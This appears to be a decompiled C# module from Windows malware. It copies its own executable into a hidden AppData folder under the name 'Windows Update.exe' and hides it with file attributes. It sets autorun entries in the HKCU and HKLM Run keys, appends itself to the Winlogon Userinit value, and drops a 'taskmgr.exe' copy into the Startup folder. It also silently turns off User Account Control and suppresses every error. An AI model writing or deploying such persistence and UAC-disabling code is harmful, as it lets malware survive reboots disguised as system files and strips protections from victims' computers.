using System;
using System.Diagnostics;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

internal sealed class Class5
{
	[DebuggerNonUserCode]
	public Class5()
	{
	}

	public static void smethod_0()
	{
		string path = "Windows Update.exe";
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Update";
		string text2 = Path.Combine(text, path);
		if (Operators.CompareString(Environment.CurrentDirectory, text, false) == 0)
		{
			return;
		}
		try
		{
			smethod_1();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		checked
		{
			if (File.Exists(text2))
			{
				try
				{
					File.SetAttributes(text2, FileAttributes.Normal);
					File.Delete(text2);
					File.Copy(Process.GetCurrentProcess().MainModule!.FileName, text2);
					File.SetAttributes(text2, File.GetAttributes(text2) + 4 + 2 + 8192 + 1);
					ProcessStartInfo startInfo = new ProcessStartInfo();
					Process.Start(startInfo);
					Environment.Exit(0);
					return;
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
					return;
				}
			}
			try
			{
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
					File.SetAttributes(text, File.GetAttributes(text) + 4 + 2 + 1 + 8192);
				}
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, text2);
				ProcessStartInfo startInfo2 = new ProcessStartInfo();
				Process.Start(startInfo2);
				Environment.Exit(0);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void smethod_1()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Update\\Windows Update.exe";
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\taskmgr.exe";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("Update") == null)
			{
				registryKey.SetValue("Update", text);
			}
			else if (Operators.CompareString((string)registryKey.GetValue("Update"), text, false) != 0)
			{
				registryKey.DeleteValue("Update");
				registryKey.SetValue("Update", text);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			if (!File.Exists(text2))
			{
				try
				{
					File.Copy(Process.GetCurrentProcess().MainModule!.FileName, text2);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("Update") == null)
			{
				registryKey.SetValue("Update", text);
			}
			else if (Operators.CompareString((string)registryKey.GetValue("Update"), text, false) != 0)
			{
				registryKey.DeleteValue("Update");
				registryKey.SetValue("Update", text);
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);
			string text3 = registryKey.GetValue("Userinit")!.ToString();
			if (!text3.Contains(text))
			{
				registryKey.SetValue("Userinit", text3 + text + ",");
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			string text4 = registryKey.GetValue("EnableLUA")!.ToString();
			if (Operators.CompareString(text4, "1", false) == 0)
			{
				registryKey.SetValue("EnableLUA", "0");
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
	}
}
